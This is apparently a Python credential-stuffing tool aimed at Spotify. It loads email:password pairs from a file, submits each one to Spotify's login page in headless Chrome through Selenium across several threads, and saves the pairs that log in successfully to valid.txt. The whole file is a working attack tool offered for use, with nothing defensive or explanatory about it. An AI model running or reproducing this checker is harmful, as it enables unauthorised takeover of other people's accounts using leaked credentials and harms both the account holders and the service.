import os,time,threading
try:
    import colorama
    from colorama import Fore,Style
    import selenium
    import selenium.webdriver
    import selenium.webdriver.chrome
    from selenium.webdriver.common.by import By
except:
    os.system("pip install -r requirements.txt")


#STATIC CONFIGS
CURRENT_THREADS = 0 # DO NOT MODIFY
colorama.init(autoreset=True)

#PROGRAM CONFIGS#
MAX_THREADS = 5
ACCOUNT_FILE_NAME = "accounts.txt"
SEPARATED_BY = ":"
OUTPUT_FILE = "valid.txt"
LOG_LEVEL = 1  # 1 - Will print what account its checking and it will say whether its valid or not.
               # 2 - Will print only if its valid or not.
               # 3 - Won't print nothing.
class Program():
    def __init__(self,email,passw):
        self.login = "https://accounts.spotify.com/login"
        options = selenium.webdriver.ChromeOptions()
        options.add_argument("--headless")
        options.add_argument("--disable-gpu")
        options.add_argument("--incognito")
        options.add_argument('--disable-extensions')
        options.add_argument("--test-type")
        options.add_argument('--ignore-gpu-blacklist')
        options.add_argument('--no-default-browser-check')
        options.add_argument('--no-first-run')
        options.add_argument('--disable-default-apps')
        options.add_argument('--disable-infobars')
        options.add_argument("--log-level=3")
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        self.Driver = selenium.webdriver.Chrome(options=options)
        self.Driver.get(self.login)

        self.username_space = self.Driver.find_element(By.ID,"login-username")
        self.password_space = self.Driver.find_element(By.ID,"login-password")
        self.login_button = self.Driver.find_element(By.ID,"login-button")

        self.login = self.Driver.current_url
        self.TryAccount(email,passw)
    def TryAccount(self,email,passw):
        global CURRENT_THREADS
        if LOG_LEVEL == 1:
            print("{0}Checking {1}:{2}...".format(Fore.YELLOW,email,passw))
        self.username_space.send_keys(email)
        self.password_space.send_keys(passw)
        time.sleep(1)
        self.login_button.click()
        time.sleep(1)
        if self.Driver.current_url != self.login:
            if LOG_LEVEL == 1 or LOG_LEVEL == 2:
                print("{0}VALID! {1}:{2}".format(Fore.GREEN,email,passw))
            self.Save(account)
        else:
            if LOG_LEVEL == 1 or LOG_LEVEL == 2:
                print("{0}INVALID! {1}:{2}".format(Fore.RED,email,passw))
        time.sleep(0.5)
        CURRENT_THREADS -= 1
        self.Driver.close()

    def Save(self,content):
        with open(OUTPUT_FILE,"a") as file:
            file.write("\n"+content)

with open(ACCOUNT_FILE_NAME, "r") as file:
    accounts = file.readlines()

for account in accounts:
    email, password = account.strip().split(SEPARATED_BY)
    
    while CURRENT_THREADS >= MAX_THREADS:
        time.sleep(1)
    
    thread = threading.Thread(target=Program, args=(email, password))
    thread.start()
    
    CURRENT_THREADS += 1
    continue